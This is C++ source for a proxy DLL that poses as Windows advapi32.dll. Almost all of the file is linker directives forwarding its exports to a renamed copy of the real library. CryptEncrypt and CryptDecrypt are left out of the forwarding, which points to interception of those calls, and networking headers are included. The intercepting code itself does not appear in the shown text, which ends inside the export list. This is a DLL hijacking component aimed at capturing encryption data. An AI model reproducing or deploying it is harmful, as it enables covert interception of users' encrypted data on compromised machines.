#define WIN32_LEAN_AND_MEAN
#define UNICODE

#pragma comment (lib, "ws2_32")

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wincrypt.h>
#include <fstream>
#include <inttypes.h>
#include <string>
#include <string.h>
#include <time.h>

using namespace std;

#pragma comment (linker, "/export:A_SHAFinal=advapi32_.A_SHAFinal,@1002")
#pragma comment (linker, "/export:A_SHAInit=advapi32_.A_SHAInit,@1003")
#pragma comment (linker, "/export:A_SHAUpdate=advapi32_.A_SHAUpdate,@1004")
#pragma comment (linker, "/export:AbortSystemShutdownA=advapi32_.AbortSystemShutdownA,@1005")
#pragma comment (linker, "/export:AbortSystemShutdownW=advapi32_.AbortSystemShutdownW,@1006")
#pragma comment (linker, "/export:AccessCheck=advapi32_.AccessCheck,@1007")
#pragma comment (linker, "/export:AccessCheckAndAuditAlarmA=advapi32_.AccessCheckAndAuditAlarmA,@1008")
#pragma comment (linker, "/export:AccessCheckAndAuditAlarmW=advapi32_.AccessCheckAndAuditAlarmW,@1009")
#pragma comment (linker, "/export:AccessCheckByType=advapi32_.AccessCheckByType,@1010")
#pragma comment (linker, "/export:AccessCheckByTypeAndAuditAlarmA=advapi32_.AccessCheckByTypeAndAuditAlarmA,@1011")
#pragma comment (linker, "/export:AccessCheckByTypeAndAuditAlarmW=advapi32_.AccessCheckByTypeAndAuditAlarmW,@1012")
#pragma comment (linker, "/export:AccessCheckByTypeResultList=advapi32_.AccessCheckByTypeResultList,@1013")
#pragma comment (linker, "/export:AccessCheckByTypeResultListAndAuditAlarmA=advapi32_.AccessCheckByTypeResultListAndAuditAlarmA,@1014")
#pragma comment (linker, "/export:AccessCheckByTypeResultListAndAuditAlarmByHandleA=advapi32_.AccessCheckByTypeResultListAndAuditAlarmByHandleA,@1015")
#pragma comment (linker, "/export:AccessCheckByTypeResultListAndAuditAlarmByHandleW=advapi32_.AccessCheckByTypeResultListAndAuditAlarmByHandleW,@1016")
#pragma comment (linker, "/export:AccessCheckByTypeResultListAndAuditAlarmW=advapi32_.AccessCheckByTypeResultListAndAuditAlarmW,@1017")
#pragma comment (linker, "/export:AddAccessAllowedAce=advapi32_.AddAccessAllowedAce,@1018")
#pragma comment (linker, "/export:AddAccessAllowedAceEx=advapi32_.AddAccessAllowedAceEx,@1019")
#pragma comment (linker, "/export:AddAccessAllowedObjectAce=advapi32_.AddAccessAllowedObjectAce,@1020")
#pragma comment (linker, "/export:AddAccessDeniedAce=advapi32_.AddAccessDeniedAce,@1021")
#pragma comment (linker, "/export:AddAccessDeniedAceEx=advapi32_.AddAccessDeniedAceEx,@1022")
#pragma comment (linker, "/export:AddAccessDeniedObjectAce=advapi32_.AddAccessDeniedObjectAce,@1023")
#pragma comment (linker, "/export:AddAce=advapi32_.AddAce,@1024")
#pragma comment (linker, "/export:AddAuditAccessAce=advapi32_.AddAuditAccessAce,@1025")
#pragma comment (linker, "/export:AddAuditAccessAceEx=advapi32_.AddAuditAccessAceEx,@1026")
#pragma comment (linker, "/export:AddAuditAccessObjectAce=advapi32_.AddAuditAccessObjectAce,@1027")
#pragma comment (linker, "/export:AddConditionalAce=advapi32_.AddConditionalAce,@1028")
#pragma comment (linker, "/export:AddMandatoryAce=advapi32_.AddMandatoryAce,@1029")
#pragma comment (linker, "/export:AddUsersToEncryptedFile=advapi32_.AddUsersToEncryptedFile,@1030")
#pragma comment (linker, "/export:AddUsersToEncryptedFileEx=advapi32_.AddUsersToEncryptedFileEx,@1031")
#pragma comment (linker, "/export:AdjustTokenGroups=advapi32_.AdjustTokenGroups,@1032")
#pragma comment (linker, "/export:AdjustTokenPrivileges=advapi32_.AdjustTokenPrivileges,@1033")
#pragma comment (linker, "/export:AllocateAndInitializeSid=advapi32_.AllocateAndInitializeSid,@1034")
#pragma comment (linker, "/export:AllocateLocallyUniqueId=advapi32_.AllocateLocallyUniqueId,@1035")
#pragma comment (linker, "/export:AreAllAccessesGranted=advapi32_.AreAllAccessesGranted,@1036")
#pragma comment (linker, "/export:AreAnyAccessesGranted=advapi32_.AreAnyAccessesGranted,@1037")
#pragma comment (linker, "/export:AuditComputeEffectivePolicyBySid=advapi32_.AuditComputeEffectivePolicyBySid,@1038")
#pragma comment (linker, "/export:AuditComputeEffectivePolicyByToken=advapi32_.AuditComputeEffectivePolicyByToken,@1039")
#pragma comment (linker, "/export:AuditEnumerateCategories=advapi32_.AuditEnumerateCategories,@1040")
#pragma comment (linker, "/export:AuditEnumeratePerUserPolicy=advapi32_.AuditEnumeratePerUserPolicy,@1041")
#pragma comment (linker, "/export:AuditEnumerateSubCategories=advapi32_.AuditEnumerateSubCategories,@1042")
#pragma comment (linker, "/export:AuditFree=advapi32_.AuditFree,@1043")
#pragma comment (linker, "/export:AuditLookupCategoryGuidFromCategoryId=advapi32_.AuditLookupCategoryGuidFromCategoryId,@1044")
#pragma comment (linker, "/export:AuditLookupCategoryIdFromCategoryGuid=advapi32_.AuditLookupCategoryIdFromCategoryGuid,@1045")
#pragma comment (linker, "/export:AuditLookupCategoryNameA=advapi32_.AuditLookupCategoryNameA,@1046")
#pragma comment (linker, "/export:AuditLookupCategoryNameW=advapi32_.AuditLookupCategoryNameW,@1047")
#pragma comment (linker, "/export:AuditLookupSubCategoryNameA=advapi32_.AuditLookupSubCategoryNameA,@1048")
#pragma comment (linker, "/export:AuditLookupSubCategoryNameW=advapi32_.AuditLookupSubCategoryNameW,@1049")
#pragma comment (linker, "/export:AuditQueryGlobalSaclA=advapi32_.AuditQueryGlobalSaclA,@1050")
#pragma comment (linker, "/export:AuditQueryGlobalSaclW=advapi32_.AuditQueryGlobalSaclW,@1051")
#pragma comment (linker, "/export:AuditQueryPerUserPolicy=advapi32_.AuditQueryPerUserPolicy,@1052")
#pragma comment (linker, "/export:AuditQuerySecurity=advapi32_.AuditQuerySecurity,@1053")
#pragma comment (linker, "/export:AuditQuerySystemPolicy=advapi32_.AuditQuerySystemPolicy,@1054")
#pragma comment (linker, "/export:AuditSetGlobalSaclA=advapi32_.AuditSetGlobalSaclA,@1055")
#pragma comment (linker, "/export:AuditSetGlobalSaclW=advapi32_.AuditSetGlobalSaclW,@1056")
#pragma comment (linker, "/export:AuditSetPerUserPolicy=advapi32_.AuditSetPerUserPolicy,@1057")
#pragma comment (linker, "/export:AuditSetSecurity=advapi32_.AuditSetSecurity,@1058")
#pragma comment (linker, "/export:AuditSetSystemPolicy=advapi32_.AuditSetSystemPolicy,@1059")
#pragma comment (linker, "/export:BackupEventLogA=advapi32_.BackupEventLogA,@1060")
#pragma comment (linker, "/export:BackupEventLogW=advapi32_.BackupEventLogW,@1061")
#pragma comment (linker, "/export:BaseRegCloseKey=advapi32_.BaseRegCloseKey,@1062")
#pragma comment (linker, "/export:BaseRegCreateKey=advapi32_.BaseRegCreateKey,@1063")
#pragma comment (linker, "/export:BaseRegDeleteKeyEx=advapi32_.BaseRegDeleteKeyEx,@1064")
#pragma comment (linker, "/export:BaseRegDeleteValue=advapi32_.BaseRegDeleteValue,@1065")
#pragma comment (linker, "/export:BaseRegFlushKey=advapi32_.BaseRegFlushKey,@1066")
#pragma comment (linker, "/export:BaseRegGetVersion=advapi32_.BaseRegGetVersion,@1067")
#pragma comment (linker, "/export:BaseRegLoadKey=advapi32_.BaseRegLoadKey,@1068")
#pragma comment (linker, "/export:BaseRegOpenKey=advapi32_.BaseRegOpenKey,@1069")
#pragma comment (linker, "/export:BaseRegRestoreKey=advapi32_.BaseRegRestoreKey,@1070")
#pragma comment (linker, "/export:BaseRegSaveKeyEx=advapi32_.BaseRegSaveKeyEx,@1071")
#pragma comment (linker, "/export:BaseRegSetKeySecurity=advapi32_.BaseRegSetKeySecurity,@1072")
#pragma comment (linker, "/export:BaseRegSetValue=advapi32_.BaseRegSetValue,@1073")
#pragma comment (linker, "/export:BaseRegUnLoadKey=advapi32_.BaseRegUnLoadKey,@1074")
#pragma comment (linker, "/export:BuildExplicitAccessWithNameA=advapi32_.BuildExplicitAccessWithNameA,@1075")
#pragma comment (linker, "/export:BuildExplicitAccessWithNameW=advapi32_.BuildExplicitAccessWithNameW,@1076")
#pragma comment (linker, "/export:BuildImpersonateExplicitAccessWithNameA=advapi32_.BuildImpersonateExplicitAccessWithNameA,@1077")
#pragma comment (linker, "/export:BuildImpersonateExplicitAccessWithNameW=advapi32_.BuildImpersonateExplicitAccessWithNameW,@1078")
#pragma comment (linker, "/export:BuildImpersonateTrusteeA=advapi32_.BuildImpersonateTrusteeA,@1079")
#pragma comment (linker, "/export:BuildImpersonateTrusteeW=advapi32_.BuildImpersonateTrusteeW,@1080")
#pragma comment (linker, "/export:BuildSecurityDescriptorA=advapi32_.BuildSecurityDescriptorA,@1081")
#pragma comment (linker, "/export:BuildSecurityDescriptorW=advapi32_.BuildSecurityDescriptorW,@1082")
#pragma comment (linker, "/export:BuildTrusteeWithNameA=advapi32_.BuildTrusteeWithNameA,@1083")
#pragma comment (linker, "/export:BuildTrusteeWithNameW=advapi32_.BuildTrusteeWithNameW,@1084")
#pragma comment (linker, "/export:BuildTrusteeWithObjectsAndNameA=advapi32_.BuildTrusteeWithObjectsAndNameA,@1085")
#pragma comment (linker, "/export:BuildTrusteeWithObjectsAndNameW=advapi32_.BuildTrusteeWithObjectsAndNameW,@1086")
#pragma comment (linker, "/export:BuildTrusteeWithObjectsAndSidA=advapi32_.BuildTrusteeWithObjectsAndSidA,@1087")
#pragma comment (linker, "/export:BuildTrusteeWithObjectsAndSidW=advapi32_.BuildTrusteeWithObjectsAndSidW,@1088")
#pragma comment (linker, "/export:BuildTrusteeWithSidA=advapi32_.BuildTrusteeWithSidA,@1089")
#pragma comment (linker, "/export:BuildTrusteeWithSidW=advapi32_.BuildTrusteeWithSidW,@1090")
#pragma comment (linker, "/export:CancelOverlappedAccess=advapi32_.CancelOverlappedAccess,@1091")
#pragma comment (linker, "/export:ChangeServiceConfig2A=advapi32_.ChangeServiceConfig2A,@1092")
#pragma comment (linker, "/export:ChangeServiceConfig2W=advapi32_.ChangeServiceConfig2W,@1093")
#pragma comment (linker, "/export:ChangeServiceConfigA=advapi32_.ChangeServiceConfigA,@1094")
#pragma comment (linker, "/export:ChangeServiceConfigW=advapi32_.ChangeServiceConfigW,@1095")
#pragma comment (linker, "/export:CheckForHiberboot=advapi32_.CheckForHiberboot,@1096")
#pragma comment (linker, "/export:CheckTokenMembership=advapi32_.CheckTokenMembership,@1097")
#pragma comment (linker, "/export:ClearEventLogA=advapi32_.ClearEventLogA,@1098")
#pragma comment (linker, "/export:ClearEventLogW=advapi32_.ClearEventLogW,@1099")
#pragma comment (linker, "/export:CloseCodeAuthzLevel=advapi32_.CloseCodeAuthzLevel,@1100")
#pragma comment (linker, "/export:CloseEncryptedFileRaw=advapi32_.CloseEncryptedFileRaw,@1101")
#pragma comment (linker, "/export:CloseEventLog=advapi32_.CloseEventLog,@1102")
#pragma comment (linker, "/export:CloseServiceHandle=advapi32_.CloseServiceHandle,@1103")
#pragma comment (linker, "/export:CloseThreadWaitChainSession=advapi32_.CloseThreadWaitChainSession,@1104")
#pragma comment (linker, "/export:CloseTrace=advapi32_.CloseTrace,@1105")
#pragma comment (linker, "/export:CommandLineFromMsiDescriptor=advapi32_.CommandLineFromMsiDescriptor,@1106")
#pragma comment (linker, "/export:ComputeAccessTokenFromCodeAuthzLevel=advapi32_.ComputeAccessTokenFromCodeAuthzLevel,@1107")
#pragma comment (linker, "/export:ControlService=advapi32_.ControlService,@1108")
#pragma comment (linker, "/export:ControlServiceExA=advapi32_.ControlServiceExA,@1109")
#pragma comment (linker, "/export:ControlServiceExW=advapi32_.ControlServiceExW,@1110")
#pragma comment (linker, "/export:ControlTraceA=advapi32_.ControlTraceA,@1111")
#pragma comment (linker, "/export:ControlTraceW=advapi32_.ControlTraceW,@1112")
#pragma comment (linker, "/export:ConvertAccessToSecurityDescriptorA=advapi32_.ConvertAccessToSecurityDescriptorA,@1113")
#pragma comment (linker, "/export:ConvertAccessToSecurityDescriptorW=advapi32_.ConvertAccessToSecurityDescriptorW,@1114")
#pragma comment (linker, "/export:ConvertSDToStringSDDomainW=advapi32_.ConvertSDToStringSDDomainW,@1115")
#pragma comment (linker, "/export:ConvertSDToStringSDRootDomainA=advapi32_.ConvertSDToStringSDRootDomainA,@1116")
#pragma comment (linker, "/export:ConvertSDToStringSDRootDomainW=advapi32_.ConvertSDToStringSDRootDomainW,@1117")
#pragma comment (linker, "/export:ConvertSecurityDescriptorToAccessA=advapi32_.ConvertSecurityDescriptorToAccessA,@1118")
#pragma comment (linker, "/export:ConvertSecurityDescriptorToAccessNamedA=advapi32_.ConvertSecurityDescriptorToAccessNamedA,@1119")
#pragma comment (linker, "/export:ConvertSecurityDescriptorToAccessNamedW=advapi32_.ConvertSecurityDescriptorToAccessNamedW,@1120")
#pragma comment (linker, "/export:ConvertSecurityDescriptorToAccessW=advapi32_.ConvertSecurityDescriptorToAccessW,@1121")
#pragma comment (linker, "/export:ConvertSecurityDescriptorToStringSecurityDescriptorA=advapi32_.ConvertSecurityDescriptorToStringSecurityDescriptorA,@1122")
#pragma comment (linker, "/export:ConvertSecurityDescriptorToStringSecurityDescriptorW=advapi32_.ConvertSecurityDescriptorToStringSecurityDescriptorW,@1123")
#pragma comment (linker, "/export:ConvertSidToStringSidA=advapi32_.ConvertSidToStringSidA,@1124")
#pragma comment (linker, "/export:ConvertSidToStringSidW=advapi32_.ConvertSidToStringSidW,@1125")
#pragma comment (linker, "/export:ConvertStringSDToSDDomainA=advapi32_.ConvertStringSDToSDDomainA,@1126")
#pragma comment (linker, "/export:ConvertStringSDToSDDomainW=advapi32_.ConvertStringSDToSDDomainW,@1127")
#pragma comment (linker, "/export:ConvertStringSDToSDRootDomainA=advapi32_.ConvertStringSDToSDRootDomainA,@1128")
#pragma comment (linker, "/export:ConvertStringSDToSDRootDomainW=advapi32_.ConvertStringSDToSDRootDomainW,@1129")
#pragma comment (linker, "/export:ConvertStringSecurityDescriptorToSecurityDescriptorA=advapi32_.ConvertStringSecurityDescriptorToSecurityDescriptorA,@1130")
#pragma comment (linker, "/export:ConvertStringSecurityDescriptorToSecurityDescriptorW=advapi32_.ConvertStringSecurityDescriptorToSecurityDescriptorW,@1131")
#pragma comment (linker, "/export:ConvertStringSidToSidA=advapi32_.ConvertStringSidToSidA,@1132")
#pragma comment (linker, "/export:ConvertStringSidToSidW=advapi32_.ConvertStringSidToSidW,@1133")
#pragma comment (linker, "/export:ConvertToAutoInheritPrivateObjectSecurity=advapi32_.ConvertToAutoInheritPrivateObjectSecurity,@1134")
#pragma comment (linker, "/export:CopySid=advapi32_.CopySid,@1135")
#pragma comment (linker, "/export:CreateCodeAuthzLevel=advapi32_.CreateCodeAuthzLevel,@1136")
#pragma comment (linker, "/export:CreatePrivateObjectSecurity=advapi32_.CreatePrivateObjectSecurity,@1137")
#pragma comment (linker, "/export:CreatePrivateObjectSecurityEx=advapi32_.CreatePrivateObjectSecurityEx,@1138")
#pragma comment (linker, "/export:CreatePrivateObjectSecurityWithMultipleInheritance=advapi32_.CreatePrivateObjectSecurityWithMultipleInheritance,@1139")
#pragma comment (linker, "/export:CreateProcessAsUserA=advapi32_.CreateProcessAsUserA,@1140")
#pragma comment (linker, "/export:CreateProcessAsUserW=advapi32_.CreateProcessAsUserW,@1141")
#pragma comment (linker, "/export:CreateProcessWithLogonW=advapi32_.CreateProcessWithLogonW,@1142")
#pragma comment (linker, "/export:CreateProcessWithTokenW=advapi32_.CreateProcessWithTokenW,@1143")
#pragma comment (linker, "/export:CreateRestrictedToken=advapi32_.CreateRestrictedToken,@1144")
#pragma comment (linker, "/export:CreateServiceA=advapi32_.CreateServiceA,@1145")
#pragma comment (linker, "/export:CreateServiceW=advapi32_.CreateServiceW,@1146")
#pragma comment (linker, "/export:CreateTraceInstanceId=advapi32_.CreateTraceInstanceId,@1147")
#pragma comment (linker, "/export:CreateWellKnownSid=advapi32_.CreateWellKnownSid,@1148")
#pragma comment (linker, "/export:CredBackupCredentials=advapi32_.CredBackupCredentials,@1149")
#pragma comment (linker, "/export:CredDeleteA=advapi32_.CredDeleteA,@1150")
#pragma comment (linker, "/export:CredDeleteW=advapi32_.CredDeleteW,@1151")
#pragma comment (linker, "/export:CredEncryptAndMarshalBinaryBlob=advapi32_.CredEncryptAndMarshalBinaryBlob,@1152")
#pragma comment (linker, "/export:CredEnumerateA=advapi32_.CredEnumerateA,@1153")
#pragma comment (linker, "/export:CredEnumerateW=advapi32_.CredEnumerateW,@1154")
#pragma comment (linker, "/export:CredFindBestCredentialA=advapi32_.CredFindBestCredentialA,@1155")
#pragma comment (linker, "/export:CredFindBestCredentialW=advapi32_.CredFindBestCredentialW,@1156")
#pragma comment (linker, "/export:CredFree=advapi32_.CredFree,@1157")
#pragma comment (linker, "/export:CredGetSessionTypes=advapi32_.CredGetSessionTypes,@1158")
#pragma comment (linker, "/export:CredGetTargetInfoA=advapi32_.CredGetTargetInfoA,@1159")
#pragma comment (linker, "/export:CredGetTargetInfoW=advapi32_.CredGetTargetInfoW,@1160")
#pragma comment (linker, "/export:CredIsMarshaledCredentialA=advapi32_.CredIsMarshaledCredentialA,@1161")
#pragma comment (linker, "/export:CredIsMarshaledCredentialW=advapi32_.CredIsMarshaledCredentialW,@1162")
#pragma comment (linker, "/export:CredIsProtectedA=advapi32_.CredIsProtectedA,@1163")
#pragma comment (linker, "/export:CredIsProtectedW=advapi32_.CredIsProtectedW,@1164")
#pragma comment (linker, "/export:CredMarshalCredentialA=advapi32_.CredMarshalCredentialA,@1165")
#pragma comment (linker, "/export:CredMarshalCredentialW=advapi32_.CredMarshalCredentialW,@1166")
#pragma comment (linker, "/export:CredProfileLoaded=advapi32_.CredProfileLoaded,@1167")
#pragma comment (linker, "/export:CredProfileLoadedEx=advapi32_.CredProfileLoadedEx,@1168")
#pragma comment (linker, "/export:CredProfileUnloaded=advapi32_.CredProfileUnloaded,@1169")
#pragma comment (linker, "/export:CredProtectA=advapi32_.CredProtectA,@1170")
#pragma comment (linker, "/export:CredProtectW=advapi32_.CredProtectW,@1171")
#pragma comment (linker, "/export:CredReadA=advapi32_.CredReadA,@1172")
#pragma comment (linker, "/export:CredReadByTokenHandle=advapi32_.CredReadByTokenHandle,@1173")
#pragma comment (linker, "/export:CredReadDomainCredentialsA=advapi32_.CredReadDomainCredentialsA,@1174")
#pragma comment (linker, "/export:CredReadDomainCredentialsW=advapi32_.CredReadDomainCredentialsW,@1175")
#pragma comment (linker, "/export:CredReadW=advapi32_.CredReadW,@1176")
#pragma comment (linker, "/export:CredRenameA=advapi32_.CredRenameA,@1177")
#pragma comment (linker, "/export:CredRenameW=advapi32_.CredRenameW,@1178")
#pragma comment (linker, "/export:CredRestoreCredentials=advapi32_.CredRestoreCredentials,@1179")
#pragma comment (linker, "/export:CredUnmarshalCredentialA=advapi32_.CredUnmarshalCredentialA,@1180")
#pragma comment (linker, "/export:CredUnmarshalCredentialW=advapi32_.CredUnmarshalCredentialW,@1181")
#pragma comment (linker, "/export:CredUnprotectA=advapi32_.CredUnprotectA,@1182")
#pragma comment (linker, "/export:CredUnprotectW=advapi32_.CredUnprotectW,@1183")
#pragma comment (linker, "/export:CredWriteA=advapi32_.CredWriteA,@1184")
#pragma comment (linker, "/export:CredWriteDomainCredentialsA=advapi32_.CredWriteDomainCredentialsA,@1185")
#pragma comment (linker, "/export:CredWriteDomainCredentialsW=advapi32_.CredWriteDomainCredentialsW,@1186")
#pragma comment (linker, "/export:CredWriteW=advapi32_.CredWriteW,@1187")
#pragma comment (linker, "/export:CredpConvertCredential=advapi32_.CredpConvertCredential,@1188")
#pragma comment (linker, "/export:CredpConvertOneCredentialSize=advapi32_.CredpConvertOneCredentialSize,@1189")
#pragma comment (linker, "/export:CredpConvertTargetInfo=advapi32_.CredpConvertTargetInfo,@1190")
#pragma comment (linker, "/export:CredpDecodeCredential=advapi32_.CredpDecodeCredential,@1191")
#pragma comment (linker, "/export:CredpEncodeCredential=advapi32_.CredpEncodeCredential,@1192")
#pragma comment (linker, "/export:CredpEncodeSecret=advapi32_.CredpEncodeSecret,@1193")
#pragma comment (linker, "/export:CryptAcquireContextA=advapi32_.CryptAcquireContextA,@1194")
#pragma comment (linker, "/export:CryptAcquireContextW=advapi32_.CryptAcquireContextW,@1195")
#pragma comment (linker, "/export:CryptContextAddRef=advapi32_.CryptContextAddRef,@1196")
#pragma comment (linker, "/export:CryptCreateHash=advapi32_.CryptCreateHash,@1197")
/*
 *#pragma comment (linker, "/export:CryptDecrypt=advapi32_.CryptDecrypt,@1198")
 */
#pragma comment (linker, "/export:CryptDeriveKey=advapi32_.CryptDeriveKey,@1199")
#pragma comment (linker, "/export:CryptDestroyHash=advapi32_.CryptDestroyHash,@1200")
#pragma comment (linker, "/export:CryptDestroyKey=advapi32_.CryptDestroyKey,@1201")
#pragma comment (linker, "/export:CryptDuplicateHash=advapi32_.CryptDuplicateHash,@1202")
#pragma comment (linker, "/export:CryptDuplicateKey=advapi32_.CryptDuplicateKey,@1203")
/*
 *#pragma comment (linker, "/export:CryptEncrypt=advapi32_.CryptEncrypt,@1204")
 */
#pragma comment (linker, "/export:CryptEnumProviderTypesA=advapi32_.CryptEnumProviderTypesA,@1205")
#pragma comment (linker, "/export:CryptEnumProviderTypesW=advapi32_.CryptEnumProviderTypesW,@1206")
#pragma comment (linker, "/export:CryptEnumProvidersA=advapi32_.CryptEnumProvidersA,@1207")
#pragma comment (linker, "/export:CryptEnumProvidersW=advapi32_.CryptEnumProvidersW,@1208")
#pragma comment (linker, "/export:CryptExportKey=advapi32_.CryptExportKey,@1209")
#pragma comment (linker, "/export:CryptGenKey=advapi32_.CryptGenKey,@1210")
#pragma comment (linker, "/export:CryptGenRandom=advapi32_.CryptGenRandom,@1211")
#pragma comment (linker, "/export:CryptGetDefaultProviderA=advapi32_.CryptGetDefaultProviderA,@1212")
#pragma comment (linker, "/export:CryptGetDefaultProviderW=advapi32_.CryptGetDefaultProviderW,@1213")
#pragma comment (linker, "/export:CryptGetHashParam=advapi32_.CryptGetHashParam,@1214")
#pragma comment (linker, "/export:CryptGetKeyParam=advapi32_.CryptGetKeyParam,@1215")
#pragma comment (linker, "/export:CryptGetProvParam=advapi32_.CryptGetProvParam,@1216")
#pragma comment (linker, "/export:CryptGetUserKey=advapi32_.CryptGetUserKey,@1217")
#pragma comment (linker, "/export:CryptHashData=advapi32_.CryptHashData,@1218")
#pragma comment (linker, "/export:CryptHashSessionKey=advapi32_.CryptHashSessionKey,@1219")
#pragma comment (linker, "/export:CryptImportKey=advapi32_.CryptImportKey,@1220")
#pragma comment (linker, "/export:CryptReleaseContext=advapi32_.CryptReleaseContext,@1221")
#pragma comment (linker, "/export:CryptSetHashParam=advapi32_.CryptSetHashParam,@1222")
#pragma comment (linker, "/export:CryptSetKeyParam=advapi32_.CryptSetKeyParam,@1223")
#pragma comment (linker, "/export:CryptSetProvParam=advapi32_.CryptSetProvParam,@1224")
#pragma comment (linker, "/export:CryptSetProviderA=advapi32_.CryptSetProviderA,@1225")
#pragma comment (linker, "/export:CryptSetProviderExA=advapi32_.CryptSetProviderExA,@1226")
#pragma comment (linker, "/export:CryptSetProviderExW=advapi32_.CryptSetProviderExW,@1227")
#pragma comment (linker, "/export:CryptSetProviderW=advapi32_.CryptSetProviderW,@1228")
#pragma comment (linker, "/export:CryptSignHashA=advapi32_.CryptSignHashA,@1229")
#pragma comment (linker, "/export:CryptSignHashW=advapi32_.CryptSignHashW,@1230")
#pragma comment (linker, "/export:CryptVerifySignatureA=advapi32_.CryptVerifySignatureA,@1231")
#pragma comment (linker, "/export:CryptVerifySignatureW=advapi32_.CryptVerifySignatureW,@1232")
#pragma comment (linker, "/export:DecryptFileA=advapi32_.DecryptFileA,@1233")
#pragma comment (linker, "/export:DecryptFileW=advapi32_.DecryptFileW,@1234")
#pragma comment (linker, "/export:DeleteAce=advapi32_.DeleteAce,@1235")
#pragma comment (linker, "/export:DeleteService=advapi32_.DeleteService,@1236")
#pragma comment (linker, "/export:DeregisterEventSource=advapi32_.DeregisterEventSource,@1237")
#pragma comment (linker, "/export:DestroyPrivateObjectSecurity=advapi32_.DestroyPrivateObjectSecurity,@1238")
#pragma comment (linker, "/export:DuplicateEncryptionInfoFile=advapi32_.DuplicateEncryptionInfoFile,@1239")
#pragma comment (linker, "/export:DuplicateToken=advapi32_.DuplicateToken,@1240")
#pragma comment (linker, "/export:DuplicateTokenEx=advapi32_.DuplicateTokenEx,@1241")
#pragma comment (linker, "/export:ElfBackupEventLogFileA=advapi32_.ElfBackupEventLogFileA,@1242")
#pragma comment (linker, "/export:ElfBackupEventLogFileW=advapi32_.ElfBackupEventLogFileW,@1243")
#pragma comment (linker, "/export:ElfChangeNotify=advapi32_.ElfChangeNotify,@1244")
#pragma comment (linker, "/export:ElfClearEventLogFileA=advapi32_.ElfClearEventLogFileA,@1245")
#pragma comment (linker, "/export:ElfClearEventLogFileW=advapi32_.ElfClearEventLogFileW,@1246")
#pragma comment (linker, "/export:ElfCloseEventLog=advapi32_.ElfCloseEventLog,@1247")
#pragma comment (linker, "/export:ElfDeregisterEventSource=advapi32_.ElfDeregisterEventSource,@1248")
#pragma comment (linker, "/export:ElfFlushEventLog=advapi32_.ElfFlushEventLog,@1249")
#pragma comment (linker, "/export:ElfNumberOfRecords=advapi32_.ElfNumberOfRecords,@1250")
#pragma comment (linker, "/export:ElfOldestRecord=advapi32_.ElfOldestRecord,@1251")
#pragma comment (linker, "/export:ElfOpenBackupEventLogA=advapi32_.ElfOpenBackupEventLogA,@1252")
#pragma comment (linker, "/export:ElfOpenBackupEventLogW=advapi32_.ElfOpenBackupEventLogW,@1253")
#pragma comment (linker, "/export:ElfOpenEventLogA=advapi32_.ElfOpenEventLogA,@1254")
#pragma comment (linker, "/export:ElfOpenEventLogW=advapi32_.ElfOpenEventLogW,@1255")
#pragma comment (linker, "/export:ElfReadEventLogA=advapi32_.ElfReadEventLogA,@1256")
#pragma comment (linker, "/export:ElfReadEventLogW=advapi32_.ElfReadEventLogW,@1257")
#pragma comment (linker, "/export:ElfRegisterEventSourceA=advapi32_.ElfRegisterEventSourceA,@1258")
#pragma comment (linker, "/export:ElfRegisterEventSourceW=advapi32_.ElfRegisterEventSourceW,@1259")
#pragma comment (linker, "/export:ElfReportEventA=advapi32_.ElfReportEventA,@1260")
#pragma comment (linker, "/export:ElfReportEventAndSourceW=advapi32_.ElfReportEventAndSourceW,@1261")
#pragma comment (linker, "/export:ElfReportEventW=advapi32_.ElfReportEventW,@1262")
#pragma comment (linker, "/export:EnableTrace=advapi32_.EnableTrace,@1263")
#pragma comment (linker, "/export:EnableTraceEx=advapi32_.EnableTraceEx,@1264")
#pragma comment (linker, "/export:EnableTraceEx2=advapi32_.EnableTraceEx2,@1265")
#pragma comment (linker, "/export:EncryptFileA=advapi32_.EncryptFileA,@1266")
#pragma comment (linker, "/export:EncryptFileW=advapi32_.EncryptFileW,@1267")
#pragma comment (linker, "/export:EncryptedFileKeyInfo=advapi32_.EncryptedFileKeyInfo,@1268")
#pragma comment (linker, "/export:EncryptionDisable=advapi32_.EncryptionDisable,@1269")
#pragma comment (linker, "/export:EnumDependentServicesA=advapi32_.EnumDependentServicesA,@1270")
#pragma comment (linker, "/export:EnumDependentServicesW=advapi32_.EnumDependentServicesW,@1271")
#pragma comment (linker, "/export:EnumDynamicTimeZoneInformation=advapi32_.EnumDynamicTimeZoneInformation,@1272")
#pragma comment (linker, "/export:EnumServiceGroupW=advapi32_.EnumServiceGroupW,@1273")
#pragma comment (linker, "/export:EnumServicesStatusA=advapi32_.EnumServicesStatusA,@1274")
#pragma comment (linker, "/export:EnumServicesStatusExA=advapi32_.EnumServicesStatusExA,@1275")
#pragma comment (linker, "/export:EnumServicesStatusExW=advapi32_.EnumServicesStatusExW,@1276")
#pragma comment (linker, "/export:EnumServicesStatusW=advapi32_.EnumServicesStatusW,@1277")
#pragma comment (linker, "/export:EnumerateTraceGuids=advapi32_.EnumerateTraceGuids,@1278")
#pragma comment (linker, "/export:EnumerateTraceGuidsEx=advapi32_.EnumerateTraceGuidsEx,@1279")
#pragma comment (linker, "/export:EqualDomainSid=advapi32_.EqualDomainSid,@1280")
#pragma comment (linker, "/export:EqualPrefixSid=advapi32_.EqualPrefixSid,@1281")
#pragma comment (linker, "/export:EqualSid=advapi32_.EqualSid,@1282")
#pragma comment (linker, "/export:EtwLogSysConfigExtension=advapi32_.EtwLogSysConfigExtension,@1283")
#pragma comment (linker, "/export:EventAccessControl=advapi32_.EventAccessControl,@1284")
#pragma comment (linker, "/export:EventAccessQuery=advapi32_.EventAccessQuery,@1285")
#pragma comment (linker, "/export:EventAccessRemove=advapi32_.EventAccessRemove,@1286")
#pragma comment (linker, "/export:EventActivityIdControl=advapi32_.EventActivityIdControl,@1287")
#pragma comment (linker, "/export:EventEnabled=advapi32_.EventEnabled,@1288")
#pragma comment (linker, "/export:EventProviderEnabled=advapi32_.EventProviderEnabled,@1289")
#pragma comment (linker, "/export:EventRegister=advapi32_.EventRegister,@1290")
#pragma comment (linker, "/export:EventSetInformation=advapi32_.EventSetInformation,@1291")
#pragma comment (linker, "/export:EventUnregister=advapi32_.EventUnregister,@1292")
#pragma comment (linker, "/export:EventWrite=advapi32_.EventWrite,@1293")
#pragma comment (linker, "/export:EventWriteEndScenario=advapi32_.EventWriteEndScenario,@1294")
#pragma comment (linker, "/export:EventWriteEx=advapi32_.EventWriteEx,@1295")
#pragma comment (linker, "/export:EventWriteStartScenario=advapi32_.EventWriteStartScenario,@1296")
#pragma comment (linker, "/export:EventWriteString=advapi32_.EventWriteString,@1297")
